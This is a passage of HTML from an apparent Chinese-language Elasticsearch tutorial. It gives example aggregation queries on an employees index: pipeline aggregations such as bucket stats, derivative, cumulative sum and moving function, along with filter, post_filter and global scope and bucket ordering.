class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 平均工资最低的工作类型</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"jobs"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"job.keyword"</span>,</span><br><span class="line">        <span class="attr">"size"</span>: <span class="number">10</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">        <span class="attr">"avg_salary"</span>: &#123;</span><br><span class="line">          <span class="attr">"avg"</span>: &#123;</span><br><span class="line">            <span class="attr">"field"</span>: <span class="string">"salary"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"min_salary_by_job"</span>:&#123;</span><br><span class="line">      <span class="attr">"min_bucket"</span>: &#123;</span><br><span class="line">        <span class="attr">"buckets_path"</span>: <span class="string">"jobs&gt;avg_salary"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 平均工资最高的工作类型</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"jobs"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"job.keyword"</span>,</span><br><span class="line">        <span class="attr">"size"</span>: <span class="number">10</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">        <span class="attr">"avg_salary"</span>: &#123;</span><br><span class="line">          <span class="attr">"avg"</span>: &#123;</span><br><span class="line">            <span class="attr">"field"</span>: <span class="string">"salary"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"max_salary_by_job"</span>:&#123;</span><br><span class="line">      <span class="attr">"max_bucket"</span>: &#123;</span><br><span class="line">        <span class="attr">"buckets_path"</span>: <span class="string">"jobs&gt;avg_salary"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 平均工资的平均工资</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"jobs"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"job.keyword"</span>,</span><br><span class="line">        <span class="attr">"size"</span>: <span class="number">10</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">        <span class="attr">"avg_salary"</span>: &#123;</span><br><span class="line">          <span class="attr">"avg"</span>: &#123;</span><br><span class="line">            <span class="attr">"field"</span>: <span class="string">"salary"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"avg_salary_by_job"</span>:&#123;</span><br><span class="line">      <span class="attr">"avg_bucket"</span>: &#123;</span><br><span class="line">        <span class="attr">"buckets_path"</span>: <span class="string">"jobs&gt;avg_salary"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 平均工资的统计分析</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"jobs"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"job.keyword"</span>,</span><br><span class="line">        <span class="attr">"size"</span>: <span class="number">10</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">        <span class="attr">"avg_salary"</span>: &#123;</span><br><span class="line">          <span class="attr">"avg"</span>: &#123;</span><br><span class="line">            <span class="attr">"field"</span>: <span class="string">"salary"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"stats_salary_by_job"</span>:&#123;</span><br><span class="line">      <span class="attr">"stats_bucket"</span>: &#123;</span><br><span class="line">        <span class="attr">"buckets_path"</span>: <span class="string">"jobs&gt;avg_salary"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 平均工资的百分位数</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"jobs"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"job.keyword"</span>,</span><br><span class="line">        <span class="attr">"size"</span>: <span class="number">10</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">        <span class="attr">"avg_salary"</span>: &#123;</span><br><span class="line">          <span class="attr">"avg"</span>: &#123;</span><br><span class="line">            <span class="attr">"field"</span>: <span class="string">"salary"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"percentiles_salary_by_job"</span>:&#123;</span><br><span class="line">      <span class="attr">"percentiles_bucket"</span>: &#123;</span><br><span class="line">        <span class="attr">"buckets_path"</span>: <span class="string">"jobs&gt;avg_salary"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Parent-Pipeline-Derivative"><a href="#Parent-Pipeline-Derivative" class="headerlink" title="Parent Pipeline: Derivative"></a>Parent Pipeline: Derivative</h3><p>按年龄、对工资进行求导（看工资发展的趋势）</p><p><img src="/images/big-data/es-06/24.jpg" alt="24"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 按照年龄对平均工资求导 </span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line"><span class="attr">"aggs"</span>: &#123;</span><br><span class="line">  <span class="attr">"age"</span>: &#123;</span><br><span class="line">    <span class="attr">"histogram"</span>: &#123;</span><br><span class="line">      <span class="attr">"field"</span>: <span class="string">"age"</span>,</span><br><span class="line">      <span class="attr">"min_doc_count"</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">"interval"</span>: <span class="number">1</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">      <span class="attr">"avg_salary"</span>: &#123;</span><br><span class="line">        <span class="attr">"avg"</span>: &#123;</span><br><span class="line">          <span class="attr">"field"</span>: <span class="string">"salary"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"derivative_avg_salary"</span>:&#123;</span><br><span class="line">        <span class="attr">"derivative"</span>: &#123;</span><br><span class="line">          <span class="attr">"buckets_path"</span>: <span class="string">"avg_salary"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//return </span></span><br><span class="line">"aggregations" : &#123;</span><br><span class="line">  "age" : &#123;</span><br><span class="line">    "buckets" : [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"key"</span> : <span class="number">20.0</span>,</span><br><span class="line">        <span class="attr">"doc_count"</span> : <span class="number">1</span>,</span><br><span class="line">        <span class="attr">"avg_salary"</span> : &#123;</span><br><span class="line">          <span class="attr">"value"</span> : <span class="number">9000.0</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"key"</span> : <span class="number">21.0</span>,</span><br><span class="line">        <span class="attr">"doc_count"</span> : <span class="number">1</span>,</span><br><span class="line">        <span class="attr">"avg_salary"</span> : &#123;</span><br><span class="line">          <span class="attr">"value"</span> : <span class="number">16000.0</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"derivative_avg_salary"</span> : &#123;</span><br><span class="line">          <span class="attr">"value"</span> : <span class="number">7000.0</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Parent-Pipeline"><a href="#Parent-Pipeline" class="headerlink" title="Parent Pipeline"></a>Parent Pipeline</h3><ul><li>年龄直方图划分的平均工资<ul><li>Cumulative Sum</li><li>Moving Function</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Cumulative_sum</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"age"</span>: &#123;</span><br><span class="line">      <span class="attr">"histogram"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"age"</span>,</span><br><span class="line">        <span class="attr">"min_doc_count"</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">"interval"</span>: <span class="number">1</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">        <span class="attr">"avg_salary"</span>: &#123;</span><br><span class="line">          <span class="attr">"avg"</span>: &#123;</span><br><span class="line">            <span class="attr">"field"</span>: <span class="string">"salary"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"cumulative_salary"</span>:&#123;</span><br><span class="line">          <span class="attr">"cumulative_sum"</span>: &#123;</span><br><span class="line">            <span class="attr">"buckets_path"</span>: <span class="string">"avg_salary"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Moving Function</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"age"</span>: &#123;</span><br><span class="line">      <span class="attr">"histogram"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"age"</span>,</span><br><span class="line">        <span class="attr">"min_doc_count"</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">"interval"</span>: <span class="number">1</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">        <span class="attr">"avg_salary"</span>: &#123;</span><br><span class="line">          <span class="attr">"avg"</span>: &#123;</span><br><span class="line">            <span class="attr">"field"</span>: <span class="string">"salary"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"moving_avg_salary"</span>:&#123;</span><br><span class="line">          <span class="attr">"moving_fn"</span>: &#123;</span><br><span class="line">            <span class="attr">"buckets_path"</span>: <span class="string">"avg_salary"</span>,</span><br><span class="line">            <span class="attr">"window"</span>:<span class="number">10</span>,</span><br><span class="line">            <span class="attr">"script"</span>: <span class="string">"MovingFunctions.min(values)"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="聚合的作用范围及排序"><a href="#聚合的作用范围及排序" class="headerlink" title="聚合的作用范围及排序"></a>聚合的作用范围及排序</h2><h3 id="聚合的作用范围"><a href="#聚合的作用范围" class="headerlink" title="聚合的作用范围"></a>聚合的作用范围</h3><ul><li>ES 聚合分析的默认作用范围是 query 的查询结果集</li><li>同时 ES 还支持以下方式改变聚合的作用范围<ul><li>Filter</li><li>Post_Filter</li><li>Global</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Query</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"range"</span>: &#123;</span><br><span class="line">      <span class="attr">"age"</span>: &#123;</span><br><span class="line">        <span class="attr">"gte"</span>: <span class="number">20</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"jobs"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>:<span class="string">"job.keyword"</span></span><br><span class="line">        </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p><img src="/images/big-data/es-06/25.jpg" alt="25"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Filter</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"older_person"</span>: &#123;</span><br><span class="line">      <span class="attr">"filter"</span>:&#123;</span><br><span class="line">        <span class="attr">"range"</span>:&#123;</span><br><span class="line">          <span class="attr">"age"</span>:&#123;</span><br><span class="line">            <span class="attr">"from"</span>:<span class="number">35</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"aggs"</span>:&#123;</span><br><span class="line">         <span class="attr">"jobs"</span>:&#123;</span><br><span class="line">           <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>:<span class="string">"job.keyword"</span></span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;&#125;,</span><br><span class="line">    <span class="attr">"all_jobs"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>:<span class="string">"job.keyword"</span></span><br><span class="line">        </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Post-Filter"><a href="#Post-Filter" class="headerlink" title="Post_Filter"></a>Post_Filter</h3><ul><li>是对聚合分析后的文档进行再次过滤</li><li>Size 无需设置为 0</li><li>使用场景<ul><li>一条语句，获取聚合信息 + 获取符合条件的文档</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Post field. 一条语句，找出所有的job类型。还能找到聚合后符合条件的结果</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"jobs"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"job.keyword"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"post_filter"</span>: &#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">      <span class="attr">"job.keyword"</span>: <span class="string">"Dev Manager"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Global"><a href="#Global" class="headerlink" title="Global"></a>Global</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// global</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"range"</span>: &#123;</span><br><span class="line">      <span class="attr">"age"</span>: &#123;</span><br><span class="line">        <span class="attr">"gte"</span>: <span class="number">40</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"jobs"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>:<span class="string">"job.keyword"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"all"</span>:&#123;</span><br><span class="line">      <span class="attr">"global"</span>: &#123;&#125;, <span class="comment">// Golbal，无视query，对全部文档进行统计</span></span><br><span class="line">      <span class="attr">"aggs"</span>:&#123;</span><br><span class="line">        <span class="attr">"salary_avg"</span>:&#123;</span><br><span class="line">          <span class="attr">"avg"</span>:&#123;</span><br><span class="line">            <span class="attr">"field"</span>:<span class="string">"salary"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="排序-1"><a href="#排序-1" class="headerlink" title="排序"></a>排序</h3><ul><li>指定 order，按照 count 和 key 排序<ul><li>默认情况，按照 count 降序排序</li><li>指定 size，就能返回相应的桶</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 排序 order</span></span><br><span class="line"><span class="comment">// count正序 and key倒叙</span></span><br><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line"><span class="attr">"query"</span>: &#123;</span><br><span class="line">  <span class="attr">"range"</span>: &#123;</span><br><span class="line">    <span class="attr">"age"</span>: &#123;</span><br><span class="line">      <span class="attr">"gte"</span>: <span class="number">20</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"aggs"</span>: &#123;</span><br><span class="line">  <span class="attr">"jobs"</span>: &#123;</span><br><span class="line">    <span class="attr">"terms"</span>: &#123;</span><br><span class="line">      <span class="attr">"field"</span>: <span class="string">"job.keyword"</span>,</span><br><span class="line">      <span class="attr">"order"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"_count"</span>: <span class="string">"asc"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"_key"</span>: <span class="string">"desc"</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="基于子聚合的值排序"><a href="#基于子聚合的值排序" class="headerlink" title="基于子聚合的值排序"></a>基于子聚合的值排序</h3><ul><li>基于子聚合的数值进行排序</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line"><span class="attr">"aggs"</span>: &#123;</span><br><span class="line">  <span class="attr">"jobs"</span>: &#123;</span><br><span class="line">    <span class="attr">"terms"</span>: &#123;</span><br><span class="line">      <span class="attr">"field"</span>: <span class="string">"job.keyword"</span>,</span><br><span class="line">      <span class="attr">"order"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"avg_salary"</span>: <span class="string">"desc"</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">      <span class="attr">"avg_salary"</span>: &#123;</span><br><span class="line">        <span class="attr">"avg"</span>: &#123;</span><br><span class="line">          <span class="attr">"field"</span>: <span class="string">"salary"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>使用子聚合，Aggregation name</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line"><span class="attr">"aggs"</span>: &#123;</span><br><span class="line">  <span class="attr">"jobs"</span>: &#123;</span><br><span class="line">    <span class="attr">"terms"</span>: &#123;</span><br><span class="line">      <span class="attr">"field"</span>: <span class="string">"job.keyword"</span>,</span><br><span class="line">      <span class="attr">"order"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"stats_salary.min"</span>: <span class="string">"desc"</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">      <span class="attr">"stats_salary"</span>: &#123;</span><br><span class="line">        <span class="attr">"stats"</span>: &#123;</span><br><span class="line">          <span class="attr">"field"</span>: <span class="string">"salary"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="聚合分析的原理及精准度问题"><a href="#聚合分析的原理及精准度问题" class="headerlink" title="聚合分析的原理及精准度问题"></a>聚合分析的原理及精准度问题</h2><h3 id="分布式系统的近似统计算法"><a href="#分布式系统的近似统计算法" class="headerlink" title="分布式系统的近似统计算法"></a>分布式系统的近似统计算法</h3><p><img src="/images/big-data/es-06/26.jpg" 